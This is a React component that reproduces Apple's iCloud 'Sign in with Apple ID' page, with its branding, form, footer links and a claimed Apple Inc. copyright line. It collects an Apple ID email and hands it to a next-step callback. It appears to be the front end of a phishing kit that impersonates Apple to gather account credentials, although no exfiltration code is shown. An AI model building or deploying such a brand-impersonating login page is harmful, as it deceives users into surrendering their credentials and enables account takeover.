import { useState } from 'react'
import Background from '../components/Background'

export default function LoginPage({ onNext }) {
  const [email, setEmail] = useState('')
  const [keepSigned, setKeepSigned] = useState(false)
  const [error, setError] = useState('')

  const handleSubmit = () => {
    if (!email.trim()) {
      setError('Enter your Apple ID to continue.')
      return
    }
    if (!email.includes('@')) {
      setError('Enter a valid Apple ID email address.')
      return
    }
    setError('')
    onNext(email.trim())
  }

  const handleKeyDown = (e) => {
    if (e.key === 'Enter') handleSubmit()
  }

  return (
    <>
      <Background />

      {/* Top bar */}
      <div className="topbar">
        <span className="topbar-logo" style={{ fontWeight: 600 }}>iCloud</span>
        <div className="topbar-right">
          <span className="topbar-link">Setup Instructions</span>
          <span style={{ color: 'rgba(255,255,255,0.4)', margin: '0 4px' }}>|</span>
          <div className="topbar-help">
            <svg viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <circle cx="12" cy="12" r="10"/>
              <path d="M9.09 9a3 3 0 015.83 1c0 2-3 3-3 3"/>
              <line x1="12" y1="17" x2="12.01" y2="17"/>
            </svg>
          </div>
        </div>
      </div>

      <div className="page">
        <div className="card">
          {/* Modern Apple ID Icon */}
          <div className="icloud-icon">
            <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
               <circle cx="50" cy="50" r="50" fill="#1d1d1f"/>
               <circle cx="50" cy="38" r="14" fill="white"/>
               <path d="M50,56 c-15,0 -24,8 -24,18 v2 c0,2 2,4 4,4 h40 c2,0 4,-2 4,-4 v-2 c0,-10 -9,-18 -24,-18 Z" fill="white"/>
            </svg>
          </div>

          <div className="title">Sign in with Apple ID</div>

          <div className="input-wrap">
            <input
              className="input-field"
              type="text"
              placeholder="Apple ID"
              value={email}
              onChange={e => { setEmail(e.target.value); setError('') }}
              onKeyDown={handleKeyDown}
              autoFocus
            />
            <button
              className={`input-arrow ${email.length > 0 ? 'active' : ''}`}
              onClick={handleSubmit}
            >
              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round">
                <path d="M5 12h14M12 5l7 7-7 7"/>
              </svg>
            </button>
          </div>

          {error && <div className="error-msg">{error}</div>}

          <label className="checkbox-row">
            <input
              type="checkbox"
              checked={keepSigned}
              onChange={e => setKeepSigned(e.target.checked)}
            />
            Keep me signed in
          </label>

          <button className="link" style={{ marginTop: 20 }}>
            Forgotten your Apple ID or password?
          </button>
        </div>
      </div>

      <div className="bottom-links">
        <a href="#">Create Apple ID</a>
        <span className="sep">|</span>
        <a href="#">System Status</a>
        <span className="sep">|</span>
        <a href="#">Privacy Policy</a>
        <span className="sep">|</span>
        <a href="#">Terms &amp; Conditions</a>
        <span className="sep">|</span>
        <span className="copyright">Copyright © 2025 Apple Inc. All rights reserved.</span>
      </div>
    </>

  )
}
